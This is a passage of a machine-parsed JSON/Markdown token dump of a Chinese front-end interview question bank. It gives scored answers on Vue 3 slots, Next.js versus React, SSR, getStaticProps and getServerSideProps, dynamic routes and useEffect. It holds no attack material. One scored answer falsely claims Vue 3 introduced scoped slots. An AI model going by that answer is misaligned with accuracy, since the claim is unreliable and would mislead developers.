级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Vue 3的插槽（Slots）与Vue 2相比有一些改进和变化。首先，Vue 3支持具名插槽和默认插槽的混合使用，这使得插槽的使用更加灵活。其次，Vue 3引入了作用域插槽（Scoped Slots），允许你在插槽中访问子组件的数据和方法。此外，Vue 3还改进了插槽的渲染和更新性能。","text":"Vue 3的插槽（Slots）与Vue 2相比有一些改进和变化。首先，Vue 3支持具名插槽和默认插槽的混合使用，这使得插槽的使用更加灵活。其次，Vue 3引入了作用域插槽（Scoped Slots），允许你在插槽中访问子组件的数据和方法。此外，Vue 3还改进了插槽的渲染和更新性能。","tokens":[{"type":"text","raw":"Vue 3的插槽（Slots）与Vue 2相比有一些改进和变化。首先，Vue 3支持具名插槽和默认插槽的混合使用，这使得插槽的使用更加灵活。其次，Vue 3引入了作用域插槽（Scoped Slots），允许你在插槽中访问子组件的数据和方法。此外，Vue 3还改进了插槽的渲染和更新性能。","text":"Vue 3的插槽（Slots）与Vue 2相比有一些改进和变化。首先，Vue 3支持具名插槽和默认插槽的混合使用，这使得插槽的使用更加灵活。其次，Vue 3引入了作用域插槽（Scoped Slots），允许你在插槽中访问子组件的数据和方法。此外，Vue 3还改进了插槽的渲染和更新性能。","escaped":false}]}]},{"key":"Next","content":"<h1>Next</h1>\\n<h2>Next.js 与 React 技术选型的区别在哪里？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p><strong>1：</strong> React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。</p>\\n</li>\\n<li><p><strong>1：</strong> Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。</p>\\n</li>\\n</ul>\\n<h2>什么是服务器端渲染（SSR）？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。</li>\\n</ul>\\n<h2>SSR 的原理是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 当用户请求一个页面时，服务器会执行以下步骤：<ul>\\n<li>获取页面数据和模板。</li>\\n<li>使用数据和模板生成完整的 HTML 页面。</li>\\n<li>将 HTML 页面发送给浏览器。</li>\\n<li>浏览器解析和显示 HTML 页面。</li>\\n</ul>\\n</li>\\n</ul>\\n<h2>Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件</li>\\n<li><strong>1：</strong> getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点</li>\\n</ul>\\n<h2>如何在 Next.js 应用程序中配置动态路由？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件</li>\\n</ul>\\n<h2>React 中 useEffect 与 Next.js 用途是什么?有什么关系？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。</li>\\n<li><strong>1：</strong> 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。</li>\\n</ul>\\n","ast":[{"type":"heading","raw":"# Next\\n\\n","depth":1,"text":"Next","tokens":[{"type":"text","raw":"Next","text":"Next","escaped":false}]},{"type":"heading","raw":"## Next.js 与 React 技术选型的区别在哪里？\\n\\n","depth":2,"text":"Next.js 与 React 技术选型的区别在哪里？","tokens":[{"type":"text","raw":"Next.js 与 React 技术选型的区别在哪里？","text":"Next.js 与 React 技术选型的区别在哪里？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n\\n- **1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n\\n","task":false,"loose":true,"text":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n","tokens":[{"type":"text","raw":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。\\n","text":"**1：** React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","text":" React 是一个用于构建用户界面的 JavaScript 库，提供了 JSX 语法用于快速创建可复用的组件，并基于数据驱动的理念，建立单向数据流，简化了调试流程。底层使用虚拟 DOM 和 Fiber 优化渲染性能。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","task":false,"loose":true,"text":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","tokens":[{"type":"text","raw":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","text":"**1：** Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","text":" Next.js 是一个基于 React 的用于构建全栈 Web 应用程序的生产框架。不仅可以使用 React 构建用户界面，还可以使用 Next.js 的各种功能和优化，使用户可以专注于构建应用程序，而不是花时间进行配置。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 什么是服务器端渲染（SSR）？\\n\\n","depth":2,"text":"什么是服务器端渲染（SSR）？","tokens":[{"type":"text","raw":"什么是服务器端渲染（SSR）？","text":"什么是服务器端渲染（SSR）？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","task":false,"loose":false,"text":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","tokens":[{"type":"text","raw":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","text":"**1：** 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","text":" 服务器端渲染 (SSR) 是一种网页渲染技术，它在服务器端生成完整的 HTML 页面，然后将页面发送给浏览器。与客户端渲染 (CSR) 不同，SSR 在服务器端完成页面渲染，浏览器只需解析和显示 HTML 页面即可。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## SSR 的原理是什么？\\n\\n","depth":2,"text":"SSR 的原理是什么？","tokens":[{"type":"text","raw":"SSR 的原理是什么？","text":"SSR 的原理是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n  + 获取页面数据和模板。\\n  + 使用数据和模板生成完整的 HTML 页面。\\n  + 将 HTML 页面发送给浏览器。\\n  + 浏览器解析和显示 HTML 页面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n  + 获取页面数据和模板。\\n  + 使用数据和模板生成完整的 HTML 页面。\\n  + 将 HTML 页面发送给浏览器。\\n  + 浏览器解析和显示 HTML 页面。","task":false,"loose":false,"text":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n+ 获取页面数据和模板。\\n+ 使用数据和模板生成完整的 HTML 页面。\\n+ 将 HTML 页面发送给浏览器。\\n+ 浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：\\n","text":"**2：** 当用户请求一个页面时，服务器会执行以下步骤：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 当用户请求一个页面时，服务器会执行以下步骤：","text":" 当用户请求一个页面时，服务器会执行以下步骤：","escaped":false}]},{"type":"list","raw":"+ 获取页面数据和模板。\\n+ 使用数据和模板生成完整的 HTML 页面。\\n+ 将 HTML 页面发送给浏览器。\\n+ 浏览器解析和显示 HTML 页面。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"+ 获取页面数据和模板。\\n","task":false,"loose":false,"text":"获取页面数据和模板。","tokens":[{"type":"text","raw":"获取页面数据和模板。","text":"获取页面数据和模板。","tokens":[{"type":"text","raw":"获取页面数据和模板。","text":"获取页面数据和模板。","escaped":false}]}]},{"type":"list_item","raw":"+ 使用数据和模板生成完整的 HTML 页面。\\n","task":false,"loose":false,"text":"使用数据和模板生成完整的 HTML 页面。","tokens":[{"type":"text","raw":"使用数据和模板生成完整的 HTML 页面。","text":"使用数据和模板生成完整的 HTML 页面。","tokens":[{"type":"text","raw":"使用数据和模板生成完整的 HTML 页面。","text":"使用数据和模板生成完整的 HTML 页面。","escaped":false}]}]},{"type":"list_item","raw":"+ 将 HTML 页面发送给浏览器。\\n","task":false,"loose":false,"text":"将 HTML 页面发送给浏览器。","tokens":[{"type":"text","raw":"将 HTML 页面发送给浏览器。","text":"将 HTML 页面发送给浏览器。","tokens":[{"type":"text","raw":"将 HTML 页面发送给浏览器。","text":"将 HTML 页面发送给浏览器。","escaped":false}]}]},{"type":"list_item","raw":"+ 浏览器解析和显示 HTML 页面。","task":false,"loose":false,"text":"浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"浏览器解析和显示 HTML 页面。","text":"浏览器解析和显示 HTML 页面。","tokens":[{"type":"text","raw":"浏览器解析和显示 HTML 页面。","text":"浏览器解析和显示 HTML 页面。","escaped":false}]}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？\\n\\n","depth":2,"text":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","tokens":[{"type":"text","raw":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","text":"Next.js 中getStaticProps函数的用途是什么？ getServerSideProps和getStaticProps函数有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件\\n- **1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件\\n","task":false,"loose":false,"text":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","tokens":[{"type":"text","raw":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","text":"**1：** getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","text":" getStaticProps函数用于在构建时获取数据以生成静态站点。此函数在构建过程中调用，可用于从外部 API 或数据库中获取数据。然后将getStaticProps返回的数据作为 props 传递给页面组件","escaped":false}]}]},{"type":"list_item","raw":"- **1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","task":false,"loose":false,"text":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","tokens":[{"type":"text","raw":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","text":"**1：** getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","text":" getServerSideProps函数用于在运行时在服务器上获取数据以进行服务器端渲染，而getStaticProps函数用于在构建时获取数据以生成静态站点","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 如何在 Next.js 应用程序中配置动态路由？\\n\\n","depth":2,"text":"如何在 Next.js 应用程序中配置动态路由？","tokens":[{"type":"text","raw":"如何在 Next.js 应用程序中配置动态路由？","text":"如何在 Next.js 应用程序中配置动态路由？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1 分）\\n\\n","depth":4,"text":"解答（1 分）","tokens":[{"type":"text","raw":"解答（1 分）","text":"解答（1 分）","escaped":false}]},{"type":"list","raw":"- **1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","task":false,"loose":false,"text":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","tokens":[{"type":"text","raw":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","text":"**1：** Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","text":" Next.js 使用方括号[]表示 URL 路径中的动态段。例如，要为 URL 路径为/blog/[slug]的博客帖子创建动态路由，您可以在pages/blog目录中创建一个名为[slug].js的文件","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## React 中 useEffect 与 Next.js 用途是什么?有什么关系？\\n\\n","depth":2,"text":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","tokens":[{"type":"text","raw":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","text":"React 中 useEffect 与 Next.js 用途是什么?有什么关系？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。\\n- **1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。\\n","task":false,"loose":false,"text":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","tokens":[{"type":"text","raw":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","text":"**1：** useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","text":" useEffect钩子用于在功能组件中执行副作用，例如从 API 获取数据或更新文档标题。","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","task":false,"loose":false,"text":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","tokens":[{"type":"text","raw":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","text":"**1：** 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 在 Next.js 中,useEffect钩子可以用来使用fetch API 或第三方库（如 Axios 或 SWR）执行客户端数据获取。","text":" 在 Next.js 